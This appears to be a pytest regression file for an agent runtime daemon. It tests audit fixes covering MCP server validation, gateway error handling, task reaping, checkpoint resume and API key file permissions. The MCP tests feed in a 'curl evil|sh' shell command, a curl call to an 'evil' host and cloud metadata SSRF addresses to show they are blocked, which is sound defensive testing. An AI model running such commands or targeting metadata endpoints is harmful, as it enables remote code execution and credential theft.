"""审计 0825 Bundle2 回归 — E-5/E-12/E-13/E-14/E-15/E-17/E-18/E-20/E-22.

E-5  MCP register_server RCE/SSRF 门 (metadata IP + shell stdio + allowlist).
E-12 gateway finish_reason=="error" 哨兵 4 调用方检查.
E-13 _code_tasks TTL reaper + 容量上限.
E-14 graph.execute 注册 _active_executions (daemon.status 报真实活跃).
E-15 stop() drain 在途执行.
E-17 _core_handlers 单一真相源 (RPC dict 不漂).
E-18 MLX_BASE_URL 运行时解析 + gateway.reconfigure RPC 热切.
E-20 checkpoint 读写签名对齐 + graph.resume RPC 闭合读路径.
E-22 apikey/mlx-key 文件 0o600 收紧 + bootstrap key 不写明文进日志.
"""
from __future__ import annotations

import asyncio
import json
import os
import tempfile

import pytest

from agent_runtime.daemon_server import DaemonServer, _resolve_mlx_base_url
from agent_runtime.dispatchers.mcp import _mcp_validate_server


@pytest.fixture
def socket_path():
    path = tempfile.mktemp(suffix=".sock", dir="/tmp")
    yield path
    if os.path.exists(path):
        os.unlink(path)


@pytest.fixture
def store_db(tmp_path):
    db = tmp_path / "test_store.db"
    yield str(db)


@pytest.fixture
async def daemon_stub(socket_path, store_db):
    # 复用 test_daemon_server 的 stub 模式: 清 default client/model + _models,
    # 使 gateway.route 返 None → 走 stub, 确定性. 避免连真实 fusion-mlx.
    d = DaemonServer(
        socket_path=socket_path, ws_port=0, cluster_port=0, http_port=0, store_path=store_db
    )
    await d.start()
    d._gateway._default_client = None
    d._gateway._default_model = ""
    d._gateway._models.clear()
    d._planner = None
    d._rag = None
    yield d
    try:
        await d.stop()
    except Exception:
        pass


# ── E-5: MCP validator ──


class TestE5McpValidator:
    def test_blocks_cloud_metadata_ip(self):
        reason = _mcp_validate_server("http://169.254.169.254/latest/meta-data/", None)
        assert reason is not None
        assert "metadata" in reason.lower()

    def test_blocks_ssrf_host(self):
        reason = _mcp_validate_server("http://metadata.google.internal/", None)
        assert reason is not None

    def test_blocks_dangerous_stdio_bash(self):
        reason = _mcp_validate_server("", ["bash", "-c", "curl evil|sh"])
        assert reason is not None
        assert "shell" in reason.lower() or "rce" in reason.lower()

    def test_blocks_dangerous_stdio_curl(self):
        reason = _mcp_validate_server("", ["curl", "http://evil"])
        assert reason is not None

    def test_allows_safe_http_url(self):
        reason = _mcp_validate_server("http://localhost:8080/mcp", None)
        assert reason is None

    def test_allows_safe_stdio_binary(self):
        reason = _mcp_validate_server("", ["/usr/local/bin/mcp-server-foo"])
        assert reason is None

    def test_allowlist_blocks_unlisted_host(self, monkeypatch):
        monkeypatch.setenv("FUSION_MCP_ALLOWLIST", "localhost,allowed.local")
        reason = _mcp_validate_server("http://evil.com/mcp", None)
        assert reason is not None
        assert "allowlist" in reason.lower()

    def test_allowlist_permits_listed_host(self, monkeypatch):
        monkeypatch.setenv("FUSION_MCP_ALLOWLIST", "localhost,allowed.local")
        reason = _mcp_validate_server("http://allowed.local/mcp", None)
        assert reason is None


# ── E-12: gateway error sentinel ──


class TestE12GatewaySentinel:
    def test_planner_falls_back_on_gateway_error(self, monkeypatch):
        from agent_runtime.planner import PlannerEngine

        class FakeGateway:
            async def chat(self, **kwargs):
                from agent_runtime.llm_gateway import GatewayResponse

                return GatewayResponse(
                    content="", finish_reason="error", usage={"error": "boom"}
                )

        eng = PlannerEngine.__new__(PlannerEngine)
        eng.gateway = FakeGateway()
        monkeypatch.setattr(
            eng, "_generate_steps_stub", lambda t, c, f: ["stub-step"]
        )
        result = asyncio.run(
            eng._generate_steps_with_llm("task", "ctx", ["f.py"])
        )
        assert result == ["stub-step"]

    def test_verifier_raises_on_gateway_error(self, monkeypatch, caplog):
        import logging

        from agent_runtime.llm_gateway import GatewayResponse
        from agent_runtime.verifier import VerificationEngine

        class FakeGateway:
            async def chat(self, **kwargs):
                return GatewayResponse(
                    content="", finish_reason="error", usage={"error": "boom"}
                )

        eng = VerificationEngine.__new__(VerificationEngine)
        eng.gateway = FakeGateway()
        eng.max_attempts = 1
        with caplog.at_level(logging.ERROR):
            out = asyncio.run(eng._call_llm("prompt", 1, 1))
        # verifier swallows RuntimeError -> returns None (no false-pass).
        assert out is None
        # E-12 sentinel path must fire: log carries "LLM gateway error" not
        # "invalid JSON" (which would mean content="" slipped past the guard).
        log_text = "\n".join(r.getMessage() for r in caplog.records)
        assert "LLM gateway error" in log_text, "sentinel guard did not fire"

    def test_workflow_raises_on_gateway_error(self, monkeypatch):
        from agent_runtime.llm_gateway import GatewayResponse
        from agent_runtime.workflow_engine import WorkflowEngine

        class FakeGateway:
            async def chat(self, **kwargs):
                return GatewayResponse(
                    content="", finish_reason="error", usage={"error": "boom"}
                )

        eng = WorkflowEngine.__new__(WorkflowEngine)
        eng.llm_gateway = FakeGateway()
        eng.orchestrator = None
        eng.tool_registry = None
        agent_cfg = {"name": "agent-x", "system_prompt": "sys", "agent_id": ""}
        with pytest.raises(RuntimeError, match="gateway error"):
            asyncio.run(eng._run_agent(agent_cfg, "do thing"))


# ── E-13: _code_tasks reaper ──


class TestE13CodeTasksReaper:
    @pytest.mark.asyncio
    async def test_reap_evicts_over_capacity(self, daemon_stub):
        d = daemon_stub
        d._code_tasks_max = 2
        d._code_tasks_ttl = 3600
        for i in range(5):
            d._code_tasks[f"task-{i}"] = {
                "task_id": f"task-{i}",
                "status": "completed",
                "created_at": 0.0,
            }
        d._reap_code_tasks()
        assert len(d._code_tasks) <= d._code_tasks_max

    @pytest.mark.asyncio
    async def test_reap_preserves_running(self, daemon_stub):
        d = daemon_stub
        d._code_tasks_max = 1000
        d._code_tasks_ttl = 1
        d._code_tasks["running-1"] = {
            "task_id": "running-1",
            "status": "running",
            "created_at": 0.0,
        }
        d._code_tasks["done-1"] = {
            "task_id": "done-1",
            "status": "completed",
            "created_at": 0.0,
        }
        d._reap_code_tasks()
        assert "running-1" in d._code_tasks
        assert "done-1" not in d._code_tasks


# ── E-14/E-15: active executions + drain ──


class TestE14E15ActiveExecutions:
    @pytest.mark.asyncio
    async def test_execute_registers_active(self, daemon_stub):
        from agent_runtime.graph import AgentGraph, NodeConfig

        d = daemon_stub
        graph = AgentGraph(
            id="e14-test",
            name="e14-test",
            nodes={
                "s": NodeConfig(type="start", label="Start"),
                "e": NodeConfig(type="end", label="End"),
            },
            edges=[],
        )
        graph.start_node_id = "s"
        d.store.save_graph(graph)
        before = len(d._active_executions)
        await _rpc_call(
            d.socket_path,
            "graph.execute",
            {"graph_id": "e14-test", "input": "hi"},
        )
        # after synchronous execute, registration cleared.
        assert len(d._active_executions) == before

    @pytest.mark.asyncio
    async def test_stop_drains_in_flight(self, daemon_stub):
        d = daemon_stub

        async def long_task():
            await asyncio.sleep(0.2)
            return "done"

        fake = asyncio.ensure_future(long_task())
        d._active_executions["fake-exec"] = fake
        await d.stop()
        assert fake.done()


# ── E-17: single source core handlers ──


class TestE17CoreHandlersSingleSource:
    @pytest.mark.asyncio
    async def test_core_handlers_and_discover_match(self, daemon_stub):
        d = daemon_stub
        core = d._core_handlers()
        discover = await d._handle_rpc_discover({})
        discover_methods = {m for m in discover.get("methods", [])}
        # every core handler key must appear in discover output.
        for key in core:
            assert key in discover_methods, f"RPC {key} missing from discover"


# ── E-18: MLX URL runtime resolve + reconfigure RPC ──


class TestE18MlxUrlHotSwap:
    def test_resolve_reads_env_live(self, monkeypatch):
        monkeypatch.setenv("FUSION_GATEWAY_URL", "http://example.internal:9999/v1")
        assert _resolve_mlx_base_url() == "http://example.internal:9999/v1"

    def test_resolve_default_port(self, monkeypatch):
        monkeypatch.delenv("FUSION_GATEWAY_URL", raising=False)
        monkeypatch.setenv("FUSION_MLX_PORT", "11434")
        url = _resolve_mlx_base_url()
        assert "11434" in url

    @pytest.mark.asyncio
    async def test_gateway_reconfigure_rpc(self, daemon_stub):
        d = daemon_stub
        resp = await _rpc_call(
            d.socket_path,
            "gateway.reconfigure",
            {"base_url": "http://127.0.0.1:11434/v1"},
        )
        assert resp["result"]["reconfigured"] is True
        assert resp["result"]["base_url"].endswith("/v1")


# ── E-20: checkpoint read/write alignment + resume RPC ──


class TestE20CheckpointResume:
    def test_save_load_roundtrip(self, tmp_path):
        from agent_runtime.persistence import AgentStore

        store = AgentStore(str(tmp_path / "ck.db"))
        cid = store.save_checkpoint(
            graph_id="g1",
            session_id="s1",
            node_id="n2",
            state={
                "messages": [{"role": "user", "content": "hi"}],
                "iteration_count": 3,
                "variables": {"x": 1},
                "tool_call_chain_count": 2,
            },
        )
        assert cid > 0
        ck = store.load_latest_checkpoint(session_id="s1", graph_id="g1")
        assert ck is not None
        assert ck.current_node_id == "n2"
        assert ck.iteration_count == 3
        state = json.loads(ck.context_json)
        assert state["messages"][0]["content"] == "hi"
        assert state["variables"] == {"x": 1}

    def test_load_returns_none_when_absent(self, tmp_path):
        from agent_runtime.persistence import AgentStore

        store = AgentStore(str(tmp_path / "ck2.db"))
        assert store.load_latest_checkpoint(session_id="nope") is None

    @pytest.mark.asyncio
    async def test_graph_resume_rpc_no_checkpoint(self, daemon_stub):
        from agent_runtime.graph import AgentGraph, NodeConfig

        d = daemon_stub
        graph = AgentGraph(
            id="e20-test",
            name="e20-test",
            nodes={
                "s": NodeConfig(type="start", label="Start"),
                "e": NodeConfig(type="end", label="End"),
            },
            edges=[],
        )
        graph.start_node_id = "s"
        d.store.save_graph(graph)
        resp = await _rpc_call(
            d.socket_path,
            "graph.resume",
            {"graph_id": "e20-test", "session_id": "no-such-session"},
        )
        # no checkpoint -> ERROR event in events, status completed (RPC ok).
        assert resp["result"]["status"] == "completed"
        types = [e.get("type") for e in resp["result"]["events"]]
        assert "error" in types

    @pytest.mark.asyncio
    async def test_graph_resume_missing_params(self, daemon_stub):
        d = daemon_stub
        resp = await _rpc_call(d.socket_path, "graph.resume", {})
        assert "error" in resp["result"]


# ── E-22: key file perms + no plaintext in logs ──


class TestE22KeyStorage:
    def test_apikey_index_tightened_on_load(self, tmp_path):
        import stat

        from agent_runtime.apikey_manager import ApiKeyManager

        base = tmp_path / "apikeys"
        base.mkdir()
        idx = base / "apikeys_index.json"
        idx.write_text("[]")
        os.chmod(idx, 0o644)
        mgr = ApiKeyManager(base)
        assert mgr is not None
        mode = stat.S_IMODE(os.stat(idx).st_mode)
        assert mode == 0o600

    def test_bootstrap_key_not_logged_plaintext(self, tmp_path, caplog):
        import logging
        import re

        from agent_runtime.apikey_manager import ApiKeyManager

        base = tmp_path / "apikeys2"
        mgr = ApiKeyManager(base)
        with caplog.at_level(logging.WARNING):
            pass
        # bootstrap created in __init__; re-trigger by clearing + ensure.
        mgr._keys.clear()
        (base / "apikeys_index.json").unlink()
        with caplog.at_level(logging.WARNING):
            mgr._ensure_bootstrap_key()
        # real key = fk- followed by hex. masked marker fk-*** is allowed.
        real_key_re = re.compile(r"fk-[0-9a-f]")
        for rec in caplog.records:
            if "Bootstrap API key" in rec.getMessage():
                assert not real_key_re.search(rec.getMessage()), (
                    "plaintext key prefix leaked to log: " + rec.getMessage()
                )
                assert "prefix=" in rec.getMessage()
                return
        pytest.fail("bootstrap log line not captured")

    def test_apikey_dir_is_0o700(self, tmp_path):
        import stat

        from agent_runtime.apikey_manager import ApiKeyManager

        base = tmp_path / "apikeys3"
        mgr = ApiKeyManager(base)
        assert mgr is not None
        mode = stat.S_IMODE(os.stat(base).st_mode)
        assert mode == 0o700


async def _rpc_call(
    socket_path: str, method: str, params: dict | None = None, msg_id: int = 1
) -> dict:
    reader, writer = await asyncio.open_unix_connection(socket_path, limit=2**20)
    request = {"jsonrpc": "2.0", "id": msg_id, "method": method}
    if params:
        request["params"] = params
    writer.write(json.dumps(request).encode() + b"\n")
    await writer.drain()
    data = await asyncio.wait_for(reader.readline(), timeout=10.0)
    writer.close()
    try:
        await writer.wait_closed()
    except Exception:
        pass
    return json.loads(data)
